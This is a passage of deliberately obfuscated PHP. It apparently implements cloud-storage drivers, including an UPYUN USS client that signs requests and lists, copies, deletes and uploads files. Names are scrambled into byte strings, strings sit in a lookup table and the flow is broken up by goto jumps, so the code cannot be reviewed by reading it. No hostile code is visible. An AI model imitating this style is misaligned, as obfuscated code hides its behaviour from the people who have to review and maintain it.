str_replace($F†‚Ûš²šÇ[238], $F†‚Ûš²šÇ[33], $dó—òäÒ‘Æ[$F†‚Ûš²šÇ[165]]); $B¿ĞŞ×ÌŠ¼ = $this->client->listParts($this->bucket, $e­ÚºóöÎ, $DÂ†Œ–äÊà); goto aË´…¨Ì±Ó; eÃÅ¤íÚğØ: $a„„®™É¿´ = $this->client->__getSignatureV4($B¦½áÖè‚¯, $cÊ²µ—”­š, $a²ÍŠÊÜ×«, $B’’’˜ğ™Ü, $EÆ»Ó«¹çî); return array($F†‚Ûš²šÇ[237] => $a„„®™É¿´[$F†‚Ûš²šÇ[237]], $F†‚Ûš²šÇ[228] => $a„„®™É¿´[$F†‚Ûš²šÇ[1261]], $F†‚Ûš²šÇ[239] => $B¿ĞŞ×ÌŠ¼, $F†‚Ûš²šÇ[1258] => $a„„®™É¿´[$F†‚Ûš²šÇ[1258]]); goto fë‘àâ°†; fë‘àâ°†: } public function link($Cæï£â’ŞÙ, $F±»¹ÊÑé– = array()) { return parent::link($Cæï£â’ŞÙ, $F±»¹ÊÑé–); } public function fileOut($eùööç‹øê, $Fˆ‚äø‰ñÊ = false, $e¯´´„ì£ï = false, $aòÀÌç¿¥Ó = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[åÌÛ»ô¢‚ö™][1266])) { return parent::fileOutServer($eùööç‹øê, $Fˆ‚äø‰ñÊ, $e¯´´„ì£ï, $aòÀÌç¿¥Ó); } parent::fileOut($eùööç‹øê, $Fˆ‚äø‰ñÊ, $e¯´´„ì£ï, $aòÀÌç¿¥Ó); } public function fileOutImage($bÊÈ­¾äèš, $f ³êŒ® = 250) { if (strstr($this->endpoint, $_SERVER[åÌÛ»ô¢‚ö™][1266])) { return parent::fileOutImageServer($bÊÈ­¾äèš, $f ³êŒ®); } parent::fileOutImage($bÊÈ­¾äèš, $f ³êŒ®); } public function fileOutLink($e§¤Â¿¹Ù) { $E‰ë¨Ø»‹† =& $_SERVER[åÌÛ»ô¢‚ö™]; if (substr($e§¤Â¿¹Ù, 0, 7) == $E‰ë¨Ø»‹†[1141]) { $e§¤Â¿¹Ù = $E‰ë¨Ø»‹†[1142] . substr($e§¤Â¿¹Ù, 7); } header($E‰ë¨Ø»‹†[156] . $e§¤Â¿¹Ù); die; } public function getHost() { $e’‡íã§Š =& $_SERVER[åÌÛ»ô¢‚ö™]; $BËœ´²…¦¥ = str_rtrim(parent::getHost(), $e’‡íã§Š[8] . $this->bucket); $BËœ´²…¦¥ = explode($e’‡íã§Š[175], $BËœ´²…¦¥); return $BËœ´²…¦¥[0] . $e’‡íã§Š[175] . $this->bucket . $e’‡íã§Š[91] . $BËœ´²…¦¥[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($bï„Œ¡½“, $CÜª›±ÉÛî = 0) { parent::__construct(); $this->source = $bï„Œ¡½“; $this->sourceSize = $CÜª›±ÉÛî; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($a“ö†Æ‚Ê = false) { return $this->sourceSize; } public function getContent($d¨õâÓ¤›é = false) { return $this->fileSubstr($d¨õâÓ¤›é, 0, $this->sourceSize); } public function fileSubstr($b§ÙÓ„ëº = false, $EœÈÄŒÅŞ¾ = 0, $C¾‘—ƒ¨ = 0) { if (!$C¾‘—ƒ¨) { $C¾‘—ƒ¨ = $this->sourceSize; } $A®öáÂÈ³ = $this->sourceSize - $EœÈÄŒÅŞ¾; if ($C¾‘—ƒ¨ >= $A®öáÂÈ³) { $C¾‘—ƒ¨ = $A®öáÂÈ³; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $EœÈÄŒÅŞ¾, $C¾‘—ƒ¨); } if ($this->sourceType == self::TYPE_FILE) { if ($C¾‘—ƒ¨ <= 0) { return $_SERVER[åÌÛ»ô¢‚ö™][33]; } $cŞ’·†ìÏª = ftell($this->source); fseek_64($this->source, $cŞ’·†ìÏª + $EœÈÄŒÅŞ¾); $D‚‡ ‘Âí  = @fread($this->source, $C¾‘—ƒ¨); fseek_64($this->source, $cŞ’·†ìÏª); return $D‚‡ ‘Âí ; } } public function hashMd5($C‹´ÁÙÔáö = false) { return md5($this->getContent()); } public static function hash($B«¯´öŠœ…, $c•˜ªç¢¡´ = 0) { $b›¸ƒùÉé‰ = new PathDriverStream($B«¯´öŠœ…, $c•˜ªç¢¡´); return $b›¸ƒùÉé‰->hashSimple($B«¯´öŠœ…); } public static function md5($Fœ›…°‚â, $CÅ÷ŠÎÉŠª = 0) { $f³Ò®÷¥Ş® = new PathDriverStream($Fœ›…°‚â, $CÅ÷ŠÎÉŠª); return $f³Ò®÷¥Ş®->hashMd5($Fœ›…°‚â); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\x70\x3a\x2f\x2f\x76\60\56\x61\x70\151\x2e\x75\160\171\x75\156\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($aâ˜½ªÒ) { parent::__construct(); $this->_init($aâ˜½ªÒ); } public function _init($bºàù‹¼ï«) { $F£é·²’İ =& $_SERVER[åÌÛ»ô¢‚ö™]; foreach ($bºàù‹¼ï« as $CÜåã§Åß => $b‘Ó®„ŸƒÊ) { if (isset($this->{$CÜåã§Åß})) { $this->{$CÜåã§Åß} = $b‘Ó®„ŸƒÊ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($F£é·²’İ[1267] . LNG($F£é·²’İ[1198])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($cÂ…ôË…ÄŒ, $DÀ±¤Âë¸ = "\x47\x45\x54") { $E·……«—’ =& $_SERVER[åÌÛ»ô¢‚ö™]; $a×À¢Æ‰‹½ = gmdate($E·……«—’[1232]); $F¯‹è“ªá¨ = base64_encode(hash_hmac($E·……«—’[1268], "{$DÀ±¤Âë¸}\x26{$cÂ…ôË…ÄŒ}\x26{$a×À¢Æ‰‹½}", md5("{$this->userpass}"), !0)); $B‚ÚêÔµŒ» = array("\x41\165\x74\150\x6f\162\x69\172\x61\x74\151\157\x6e\72\125\x50\x59\125\x4e\40{$this->username}\72{$F¯‹è“ªá¨}", "\104\x61\x74\145\72{$a×À¢Æ‰‹½}"); return $B‚ÚêÔµŒ»; } public function ussRequest($cÃª‰ğ¥” , $EÜ†ØÉè« = "\x47\105\x54", $Eè’Á±¤ßĞ = false, $f”ÂË†Ë» = false, $fÒäŞöÜ = false) { goto Côë×çÏàŸ; BÒ’ÙÍ‹ßç: if (!$bÀ‚Ì„Şï) { return array($aª®ãã¤µ˜[1059] => !1, $aª®ãã¤µ˜[1061] => $aª®ãã¤µ˜[1269]); } if (strtolower($EÜ†ØÉè«) == $aª®ãã¤µ˜[198] || in_array($bÀ‚Ì„Şï[$aª®ãã¤µ˜[1059]], array($aª®ãã¤µ˜[1126], $aª®ãã¤µ˜[1270]))) { $Eè’Á±¤ßĞ = $bÀ‚Ì„Şï[$aª®ãã¤µ˜[1271]]; } else { $Eè’Á±¤ßĞ = json_decode($bÀ‚Ì„Şï[$aª®ãã¤µ˜[1061]], !0); if (!$Eè’Á±¤ßĞ) { $Eè’Á±¤ßĞ = $bÀ‚Ì„Şï[$aª®ãã¤µ˜[1061]]; } else { if (!$bÀ‚Ì„Şï[$aª®ãã¤µ˜[716]] && isset($Eè’Á±¤ßĞ[$aª®ãã¤µ˜[1272]])) { $Eè’Á±¤ßĞ = $Eè’Á±¤ßĞ[$aª®ãã¤µ˜[1272]]; } } } return array($aª®ãã¤µ˜[1059] => $bÀ‚Ì„Şï[$aª®ãã¤µ˜[716]], $aª®ãã¤µ˜[1061] => $Eè’Á±¤ßĞ); goto DÜÎÊ”£ï; Côë×çÏàŸ: $aª®ãã¤µ˜ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cÃª‰ğ¥”  = trim($cÃª‰ğ¥” , $aª®ãã¤µ˜[8]); $a¸¾“ï»–ß = "\x2f{$this->bucket}\x2f{$cÃª‰ğ¥” }"; goto bßªìåçÕ; bßªìåçÕ: $c¢ğªã…ˆÓ = $this->ussHeaders($a¸¾“ï»–ß, $EÜ†ØÉè«); if ($f”ÂË†Ë») { $c¢ğªã…ˆÓ = array_merge($c¢ğªã…ˆÓ, $f”ÂË†Ë»); } $bÀ‚Ì„Şï = url_request($this->endpoint . $a¸¾“ï»–ß, $EÜ†ØÉè«, $Eè’Á±¤ßĞ, $c¢ğªã…ˆÓ, $fÒäŞöÜ); goto BÒ’ÙÍ‹ßç; DÜÎÊ”£ï: } public function mkfile($eŠŞ¤×Ô—, $FİÑ¸ ŠŞÚ = '', $FĞ‡ìµØ× = REPEAT_RENAME) { if ($this->setContent($eŠŞ¤×Ô—, $FİÑ¸ ŠŞÚ)) { return $this->getPathOuter($eŠŞ¤×Ô—); } return !1; } public function mkdir($bØ¶æÚßË‰, $dõ»¾åºÔ¥ = REPEAT_SKIP) { $bšŒ‰ŒåÑ =& $_SERVER[åÌÛ»ô¢‚ö™]; $B¼¼ø¶ƒĞĞ = trim($bØ¶æÚßË‰, $bšŒ‰ŒåÑ[8]); if ($this->_isFolder($B¼¼ø¶ƒĞĞ)) { return $this->getPathOuter($B¼¼ø¶ƒĞĞ); } $fô§ºÖÍœŞ = array($bšŒ‰ŒåÑ[1273]); $c¨·¤ĞÒßà = $this->ussRequest($B¼¼ø¶ƒĞĞ, $bšŒ‰ŒåÑ[230], !1, $fô§ºÖÍœŞ); return $c¨·¤ĞÒßà[$bšŒ‰ŒåÑ[1059]] ? $this->getPathOuter($B¼¼ø¶ƒĞĞ) : !1; } public function copyFile($dòË‚‚†å², $A”éºËƒí¹) { $câ‚ºÈË÷ô =& $_SERVER[åÌÛ»ô¢‚ö™]; $cŸÒ°Éñ°’ = array($câ‚ºÈË÷ô[1274] . "\x2f{$this->bucket}\x2f{$dòË‚‚†å²}", $câ‚ºÈË÷ô[1275]); $f›­í¶£ = $this->ussRequest($A”éºËƒí¹, $câ‚ºÈË÷ô[232], !1, $cŸÒ°Éñ°’); return $f›­í¶£[$câ‚ºÈË÷ô[1059]] ? !0 : $this->getPathOuter($A”éºËƒí¹); } public function moveFile($FŠˆâğŒ¯, $aò¶ŠÃŒ„´) { $b÷£ƒ‚øè =& $_SERVER[åÌÛ»ô¢‚ö™]; $BÚËˆèÊßë = array($b÷£ƒ‚øè[1276] . "\57{$this->bucket}\x2f{$FŠˆâğŒ¯}", $b÷£ƒ‚øè[1275]); $Føâ¬Å¢˜ï = $this->ussRequest($aò¶ŠÃŒ„´, $b÷£ƒ‚øè[232], !1, $BÚËˆèÊßë); return $Føâ¬Å¢˜ï[$b÷£ƒ‚øè[1059]] ? !0 : $this->getPathOuter($aò¶ŠÃŒ„´); } public function delFile($AÕÍå‘ìÙ‡) { $aŸç…ö¸Š =& $_SERVER[åÌÛ»ô¢‚ö™]; $bšõ„œç§³ = $this->ussRequest($AÕÍå‘ìÙ‡, $aŸç…ö¸Š[1277]); return $bšõ„œç§³[$aŸç…ö¸Š[1059]] ? !0 : !1; } public function delFolder($dÅ‡¢«ëÂ) { goto BùÓ’ğ‡À£; C‹¿êï‰©ï: foreach ($CÍÈĞ°ÑÅæ as $bõå¬¤ÈÖÒ) { $C¤»Æ‡¯´¼ = $this->getPathInner($bõå¬¤ÈÖÒ[$A™ÌÈØÏ¢ö[75]]); if ($bõå¬¤ÈÖÒ[$A™ÌÈØÏ¢ö[76]] == $A™ÌÈØÏ¢ö[83]) { $eæÙ¥½šëâ[] = $C¤»Æ‡¯´¼; continue; } $Eãîäâ„”ƒ = $this->ussRequest($C¤»Æ‡¯´¼, $A™ÌÈØÏ¢ö[1277]); if (!$Eãîäâ„”ƒ[$A™ÌÈØÏ¢ö[1059]]) { return !1; } } $eæÙ¥½šëâ[] = $dÅ‡¢«ëÂ; foreach ($eæÙ¥½šëâ as $dÅ‡¢«ëÂ) { $Eãîäâ„”ƒ = $this->ussRequest($dÅ‡¢«ëÂ, $A™ÌÈØÏ¢ö[1277]); if (!$Eãîäâ„”ƒ[$A™ÌÈØÏ¢ö[1059]]) { return !1; } } goto EŞ¬ºáÜ¾ô; e„¢Û˜ÍŒğ: $CÍÈĞ°ÑÅæ = $this->listAll($dÅ‡¢«ëÂ); $this->listItemCache = !0; $eæÙ¥½šëâ = array(); goto C‹¿êï‰©ï; BùÓ’ğ‡À£: $A™ÌÈØÏ¢ö =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->exist($dÅ‡¢«ëÂ)) { return !0; } $this->listItemCache = !1; goto e„¢Û˜ÍŒğ; EŞ¬ºáÜ¾ô: return !0; goto eÑ†”¡ÇÑ; eÑ†”¡ÇÑ: } public function rename($F¾–Ê”Èª­, $a´£òÏ®«ç) { if ($this->isFile($F¾–Ê”Èª­)) { $a´£òÏ®«ç = get_path_father($F¾–Ê”Èª­) . $a´£òÏ®«ç; return $this->moveFile($F¾–Ê”Èª­, $a´£òÏ®«ç); } return $this->renameObject($F¾–Ê”Èª­, $a´£òÏ®«ç); } public function fileInfo($DßÖËßÓº, $E¦™“•öÒ¨ = false, $Dì¼ƒéÇƒ§ = array()) { goto c‡ªÆÉŸ†; bëŒš»ÅïÔ: $dĞ¯Úòòøğ[$BëáÏÕµƒô[200]] = $dĞ¯Úòòøğ[$BëáÏÕµƒô[107]] = 0; $dĞ¯Úòòøğ[$BëáÏÕµƒô[201]] = $dĞ¯Úòòøğ[$BëáÏÕµƒô[202]] = !0; if (empty($Dì¼ƒéÇƒ§)) { $Dì¼ƒéÇƒ§ = $this->objectMeta($DßÖËßÓº); if (!$Dì¼ƒéÇƒ§) { return $dĞ¯Úòòøğ; } } goto eÙñŒâ°£ò; eÙñŒâ°£ò: $dĞ¯Úòòøğ[$BëáÏÕµƒô[200]] = intval($Dì¼ƒéÇƒ§[$BëáÏÕµƒô[1278]]); $dĞ¯Úòòøğ[$BëáÏÕµƒô[107]] = intval($Dì¼ƒéÇƒ§[$BëáÏÕµƒô[1279]]); $dĞ¯Úòòøğ[$BëáÏÕµƒô[77]] = $Dì¼ƒéÇƒ§[$BëáÏÕµƒô[77]]; goto DÃ®‚¥ê²; c‡ªÆÉŸ†: $BëáÏÕµƒô =& $_SERVER[åÌÛ»ô¢‚ö™]; $dĞ¯Úòòøğ = array($BëáÏÕµƒô[28] => $this->pathThis($DßÖËßÓº), $BëáÏÕµƒô[75] => $this->getPathOuter($BëáÏÕµƒô[8] . $DßÖËßÓº), $BëáÏÕµƒô[29] => $BëáÏÕµƒô[171], $BëáÏÕµƒô[77] => isset($Dì¼ƒéÇƒ§[$BëáÏÕµƒô[77]]) ? $Dì¼ƒéÇƒ§[$BëáÏÕµƒô[77]] : 0, $BëáÏÕµƒô[165] => $this->ext($DßÖËßÓº)); if ($E¦™“•öÒ¨) { return $dĞ¯Úòòøğ; } goto bëŒš»ÅïÔ; DÃ®‚¥ê²: return $dĞ¯Úòòøğ; goto A±êîõ…°´; A±êîõ…°´: } public function folderInfo($b¨ÅÖ°ï³ , $c‘ºõ«ØêŸ = false) { goto AªáŒÌÀ—•; fÛ„«Ö¶‰“: $A ¦æ†öö‰[$c½÷˜‡²á³[200]] = $A ¦æ†öö‰[$c½÷˜‡²á³[107]] = 0; $A ¦æ†öö‰[$c½÷˜‡²á³[201]] = $A ¦æ†öö‰[$c½÷˜‡²á³[202]] = !0; if (empty($EÛ¥ˆÉßë¾)) { $EÛ¥ˆÉßë¾ = $this->objectMeta($b¨ÅÖ°ï³ ); if (!$EÛ¥ˆÉßë¾) { return $A ¦æ†öö‰; } } goto f§µóË«Î»; f§µóË«Î»: $A ¦æ†öö‰[$c½÷˜‡²á³[200]] = intval($EÛ¥ˆÉßë¾[$c½÷˜‡²á³[1278]]); $A ¦æ†öö‰[$c½÷˜‡²á³[107]] = intval($EÛ¥ˆÉßë¾[$c½÷˜‡²á³[1279]]); return $A ¦æ†öö‰; goto DœƒŠ¼Á„; AªáŒÌÀ—•: $c½÷˜‡²á³ =& $_SERVER[åÌÛ»ô¢‚ö™]; $A ¦æ†öö‰ = array($c½÷˜‡²á³[28] => $this->pathThis($b¨ÅÖ°ï³ ), $c½÷˜‡²á³[75] => $this->getPathOuter($c½÷˜‡²á³[8] . $b¨ÅÖ°ï³ ), $c½÷˜‡²á³[29] => $c½÷˜‡²á³[76]); if ($c‘ºõ«ØêŸ) { return $A ¦æ†öö‰; } goto fÛ„«Ö¶‰“; DœƒŠ¼Á„: } private function listObjs($cïöÎùíÏè, $B´²ã…Ö = 0, $bÁëñš§ğ› = 1000) { $A…Õ¸¢å´‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; $còĞ¶… — = array($A…Õ¸¢å´‰[1280], $A…Õ¸¢å´‰[1281] . $bÁëñš§ğ›); if ($B´²ã…Ö) { $còĞ¶… —[] = $A…Õ¸¢å´‰[1282] . $B´²ã…Ö; } $E’î´ãº = $this->ussRequest($cïöÎùíÏè, $A…Õ¸¢å´‰[234], !1, $còĞ¶… —); return !$E’î´ãº[$A…Õ¸¢å´‰[1059]] ? !1 : $E’î´ãº[$A…Õ¸¢å´‰[1061]]; } private function fileList($C¡†¨©¿±È, &$b¶–µ£¦˜, &$EÎÅ®îİ–È, $AÅ†à‚ªâÂ = false) { goto Bì¬â‘šä; e»†›ïÙŒƒ: if ($d§¨–åŒ¡) { $this->cacheMethod($C’óøëâ‹–[205], $C¡†¨©¿±È, !0); } goto câ‘ô³Ñî; Bì¬â‘šä: $C’óøëâ‹– =& $_SERVER[åÌÛ»ô¢‚ö™]; $cµºÍõÄÆÓ = $C’óøëâ‹–[33]; $aøØÛÚ¿…½ = 1000; goto CéØ»¥Ôˆ‘; CéØ»¥Ôˆ‘: $eÆˆä„ÚğØ = rtrim($C¡†¨©¿±È, $C’óøëâ‹–[8]) . $C’óøëâ‹–[8]; $d§¨–åŒ¡ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $a•©­¡‘ĞÂ = $this->listObjs($C¡†¨©¿±È, $cµºÍõÄÆÓ, $aøØÛÚ¿…½); if (!$a•©­¡‘ĞÂ) { return !1; } $cµºÍõÄÆÓ = isset($a•©­¡‘ĞÂ[$C’óøëâ‹–[1283]]) ? $a•©­¡‘ĞÂ[$C’óøëâ‹–[1283]] : $C’óøëâ‹–[33]; $C‹Ñö™Í³ = isset($a•©­¡‘ĞÂ[$C’óøëâ‹–[1284]]) ? $a•©­¡‘ĞÂ[$C’óøëâ‹–[1284]] : array(); foreach ($C‹Ñö™Í³ as $EÖøå°³Å•) { $B“„¼Ï‘‚ì = $EÖøå°³Å•[$C’óøëâ‹–[29]] == $C’óøëâ‹–[76] ? !0 : !1; $Aˆ•Û›ãæİ = ltrim($eÆˆä„ÚğØ . $EÖøå°³Å•[$C’óøëâ‹–[28]], $C’óøëâ‹–[8]) . ($B“„¼Ï‘‚ì ? $C’óøëâ‹–[8] : $C’óøëâ‹–[33]); $EÆç¥¨ÅÊ = array($C’óøëâ‹–[28] => $Aˆ•Û›ãæİ, $C’óøëâ‹–[29] => $B“„¼Ï‘‚ì ? $C’óøëâ‹–[76] : $C’óøëâ‹–[171], $C’óøëâ‹–[77] => $EÖøå°³Å•[$C’óøëâ‹–[340]], $C’óøëâ‹–[1279] => $EÖøå°³Å•[$C’óøëâ‹–[1285]]); if ($d§¨–åŒ¡) { $this->cacheMethod($C’óøëâ‹–[205], $Aˆ•Û›ãæİ, $B“„¼Ï‘‚ì); $this->cacheMethod($C’óøëâ‹–[206], $Aˆ•Û›ãæİ, $EÆç¥¨ÅÊ); } if ($B“„¼Ï‘‚ì) { $b¶–µ£¦˜[] = $Aˆ•Û›ãæİ; if ($AÅ†à‚ªâÂ) { $this->fileList($Aˆ•Û›ãæİ, $b¶–µ£¦˜, $EÎÅ®îİ–È, $AÅ†à‚ªâÂ); } continue; } $EÎÅ®îİ–È[] = $EÆç¥¨ÅÊ; } if (count($C‹Ñö™Í³) < $aøØÛÚ¿…½) { break; } } goto e»†›ïÙŒƒ; câ‘ô³Ñî: } public function listPath($A‹Ü¤ë°ÇÙ, $aÎÉôéÈó = false) { $aĞ©Ëé£Ø =& $_SERVER[åÌÛ»ô¢‚ö™]; $Bßï½äç¥¨ = $dãÙ°š›îÃ = array(); $this->fileList($A‹Ü¤ë°ÇÙ, $Bßï½äç¥¨, $dãÙ°š›îÃ); foreach ($Bßï½äç¥¨ as $b‚õº’»‡— => $a³˜…¿µ¿Â) { $Bßï½äç¥¨[$b‚õº’»‡—] = $this->folderInfo($a³˜…¿µ¿Â, $aÎÉôéÈó); } foreach ($dãÙ°š›îÃ as $b‚õº’»‡— => $a³˜…¿µ¿Â) { $dãÙ°š›îÃ[$b‚õº’»‡—] = $this->fileInfo($a³˜…¿µ¿Â[$aĞ©Ëé£Ø[28]], $aÎÉôéÈó, $a³˜…¿µ¿Â); } return array($aĞ©Ëé£Ø[74] => $Bßï½äç¥¨, $aĞ©Ëé£Ø[73] => $dãÙ°š›îÃ); } public function has($f±³¯ªõ, $d×Ê¿¢©œù = false, $f‰ÁâÎµÛ˜ = true) { goto D¦ˆÉãƒ’; D¦ˆÉãƒ’: $Eó“´À¼†ô =& $_SERVER[åÌÛ»ô¢‚ö™]; $D»óÒÊ½·š = $Eó“´À¼†ô[33]; $DßòÌÏÃÅ = 500; goto CÑ¢Š“¼”ì; dßÊ‘ô°Ã±: while (!0) { check_abort(); $d¿›ùß¡¶ = $this->listObjs($f±³¯ªõ, $D»óÒÊ½·š, $DßòÌÏÃÅ); if (!$d¿›ùß¡¶) { return !1; } $D»óÒÊ½·š = isset($d¿›ùß¡¶[$Eó“´À¼†ô[1283]]) ? $d¿›ùß¡¶[$Eó“´À¼†ô[1283]] : $Eó“´À¼†ô[33]; $d¼ÖÈì‹™ = isset($d¿›ùß¡¶[$Eó“´À¼†ô[1284]]) ? $d¿›ùß¡¶[$Eó“´À¼†ô[1284]] : array(); if (empty($d¼ÖÈì‹™)) { break; } $Eô‘Çó±â— = array_filter($d¼ÖÈì‹™, function ($Fİµ‰á¾‡×) { $B¤¦»Âå  =& $_SERVER[åÌÛ»ô¢‚ö™]; return $Fİµ‰á¾‡×[$B¤¦»Âå [29]] == $B¤¦»Âå [76]; }); $Bö‹çô¥¹œ = count($d¼ÖÈì‹™); $Eô‘Çó±â— = count($Eô‘Çó±â—); $bÇØÛÚ˜ƒ¶ = $Bö‹çô¥¹œ - $Eô‘Çó±â—; if ($d×Ê¿¢©œù) { $BŒù‡Î²„Â += $Eô‘Çó±â—; $båãÌ°©ä += $bÇØÛÚ˜ƒ¶; if ($Bö‹çô¥¹œ < $DßòÌÏÃÅ) { break; } continue; } if ($f‰ÁâÎµÛ˜) { if ($bÇØÛÚ˜ƒ¶) { return !0; } } else { if ($Eô‘Çó±â—) { return !0; } } if ($Bö‹çô¥¹œ < $DßòÌÏÃÅ) { break; } } if ($d×Ê¿¢©œù) { return array($Eó“´À¼†ô[209] => $båãÌ°©ä, $Eó“´À¼†ô[210] => $BŒù‡Î²„Â); } return !1; goto dÍù¾óèË±; CÑ¢Š“¼”ì: $båãÌ°©ä = 0; $BŒù‡Î²„Â = 0; $CÂ¾‹ÎğÖ = rtrim($f±³¯ªõ, $Eó“´À¼†ô[8]) . $Eó“´À¼†ô[8]; goto dßÊ‘ô°Ã±; dÍù¾óèË±: } public function listAll($F™à“¸÷Â) { goto b™•Ÿî·Ç; EŠËÌÄ¢‚‘: return $this->listAllFiles($F™à“¸÷Â, array_keys($fÜáÇ¯ £…), $fÜáÇ¯ £…); goto fº÷ÈÇàö; Fö¿¯İ„‡: $fÜáÇ¯ £… = array(); foreach ($EÁĞ‚Ç…‰ as $FÔË„³Ãùø) { $fÜáÇ¯ £…[$FÔË„³Ãùø[$EÂÁ¬Š¢ÅÂ[28]]] = $FÔË„³Ãùø[$EÂÁ¬Š¢ÅÂ[77]]; } foreach ($e°¯”Ì¿¿Ö as $FÔË„³Ãùø) { if (is_string($FÔË„³Ãùø)) { $fÜáÇ¯ £…[$FÔË„³Ãùø] = 0; } } goto EŠËÌÄ¢‚‘; b™•Ÿî·Ç: $EÂÁ¬Š¢ÅÂ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e°¯”Ì¿¿Ö = $EÁĞ‚Ç…‰ = array(); $this->fileList($F™à“¸÷Â, $e°¯”Ì¿¿Ö, $EÁĞ‚Ç…‰, !0); goto Fö¿¯İ„‡; fº÷ÈÇàö: } public function canRead($bÂ‘ğ¨ğñ¦) { return $this->exist($bÂ‘ğ¨ğñ¦) ? !0 : !1; } public function canWrite($cˆÎÀ·£†) { return $this->exist($cˆÎÀ·£†) ? !0 : !1; } public function getContent($F‹÷ÚàÈìÁ) { return $this->fileSubstr($F‹÷ÚàÈìÁ, 0, -1); } public function setContent($bÛ¿¬ß±Çî, $eŒëÅà¢òÊ = '') { $BóåŞÎœñ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$eŒëÅà¢òÊ) { $FÚ”£©ŞãÂ = $this->ussRequest($bÛ¿¬ß±Çî, $BóåŞÎœñ[230]); return $FÚ”£©ŞãÂ[$BóåŞÎœñ[1059]]; } $fÂŸ¦ä‹¡÷ = $this->tempFile($this->pathThis($bÛ¿¬ß±Çî)); file_put_contents($fÂŸ¦ä‹¡÷, $eŒëÅà¢òÊ); if ($this->upload($bÛ¿¬ß±Çî, $fÂŸ¦ä‹¡÷)) { $this->tempFileRemve($fÂŸ¦ä‹¡÷); return !0; } return !1; } public function fileSubstr($DÜ²šßŠ—ø, $b¾©³Òé°„, $cè·Íã¬É‘) { $A¾Ñê¢óÀ§ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!($DÕôÆæ²¢ = $this->link($DÜ²šßŠ—ø))) { return !1; } $F’¯ÎôÍ–« = !1; if ($cè·Íã¬É‘ > 0) { $B¾œˆë‘Ü = $b¾©³Òé°„ + $cè·Íã¬É‘ - 1; $F’¯ÎôÍ–« = array($A¾Ñê¢óÀ§[1246] . $b¾©³Òé°„ . $A¾Ñê¢óÀ§[437] . $B¾œˆë‘Ü); } $B İĞˆ›Ç… = url_request($DÕôÆæ²¢, $A¾Ñê¢óÀ§[234], !1, $F’¯ÎôÍ–«); return $B İĞˆ›Ç…[$A¾Ñê¢óÀ§[716]] ? $B İĞˆ›Ç…[$A¾Ñê¢óÀ§[1061]] : !1; } public function upload($aÊ­ÑïØñŒ, $A÷»‹‰‡£, $F©×ËÇô¯ = false, $dÖ×ÖãÒÂç = REPEAT_REPLACE) { goto c‚Ìî¼ºÙ; bµ¡¦“ÍÎù: if (!$D¨ÏëÒ‰‰[$Bøğ¹œÑ‰š[1059]]) { return !1; } $Eâ¬Ãœ¦ = $D¨ÏëÒ‰‰[$Bøğ¹œÑ‰š[1061]]; $CÎ”˜©œÊ = 0; goto dŸŒÛêÖç; dŸŒÛêÖç: $DĞãÆš‰¡¬ = $Eâ¬Ãœ¦[$Bøğ¹œÑ‰š[1291]]; $FÇÖÖÓßÖİ = fopen($A÷»‹‰‡£, $Bøğ¹œÑ‰š[1195]); if (!$FÇÖÖÓßÖİ) { return !1; } goto DùºŞøĞÉõ; b¾ˆ¬áóê: $D¨ÏëÒ‰‰ = $this->ussRequest($aÊ­ÑïØñŒ, $Bøğ¹œÑ‰š[232], !1, $bµ¬¸ã®òº); return $D¨ÏëÒ‰‰[$Bøğ¹œÑ‰š[1059]] ? $this->getPathOuter($fŒÎ¸¯Èğ) : !1; goto Aé…•‚‰§Á; DùºŞøĞÉõ: do { $aÅÙ¬·ƒô = $Eâ¬Ãœ¦[$Bøğ¹œÑ‰š[1292]]; fseek_64($FÇÖÖÓßÖİ, $CÎ”˜©œÊ); $d’ŸöøÚ§Ç = fread($FÇÖÖÓßÖİ, $aÅÙ¬·ƒô); $DÁÉ½Äª = 0; do { $DÁÉ½Äª++; $Eâ¬Ãœ¦ = $this->uploadPart($aÊ­ÑïØñŒ, $Eâ¬Ãœ¦, $d’ŸöøÚ§Ç); } while (!$Eâ¬Ãœ¦ && $DÁÉ½Äª < 3); if (!$Eâ¬Ãœ¦) { return !1; } $DĞãÆš‰¡¬ = $Eâ¬Ãœ¦[$Bøğ¹œÑ‰š[1291]]; $CÎ”˜©œÊ += $aÅÙ¬·ƒô; } while ($DĞãÆš‰¡¬ != -1); fclose($FÇÖÖÓßÖİ); $bµ¬¸ã®òº = array($Bøğ¹œÑ‰š[1293], $Bøğ¹œÑ‰š[1294] . $Eâ¬Ãœ¦[$Bøğ¹œÑ‰š[1295]], $Bøğ¹œÑ‰š[1289]); goto b¾ˆ¬áóê; EÅÒ”³Ş›Ÿ: $C‘„÷Ô‰£» = 1024 * 1024 * 10; $bµ¬¸ã®òº = array($Bøğ¹œÑ‰š[1287], $Bøğ¹œÑ‰š[1288] . $Bîºä¢£í, $Bøğ¹œÑ‰š[1289], $Bøğ¹œÑ‰š[1290] . $C‘„÷Ô‰£»); $D¨ÏëÒ‰‰ = $this->ussRequest($aÊ­ÑïØñŒ, $Bøğ¹œÑ‰š[232], !1, $bµ¬¸ã®òº); goto bµ¡¦“ÍÎù; c‚Ìî¼ºÙ: $Bøğ¹œÑ‰š =& $_SERVER[åÌÛ»ô¢‚ö™]; $Bîºä¢£í = IO::size($A÷»‹‰‡£); if ($Bîºä¢£í <= 1024 * 1024 * 200) { $E“‡»±‰íè = array($Bøğ¹œÑ‰š[1286] . $A÷»‹‰‡£); $D¨ÏëÒ‰‰ = $this->ussRequest($aÊ­ÑïØñŒ, 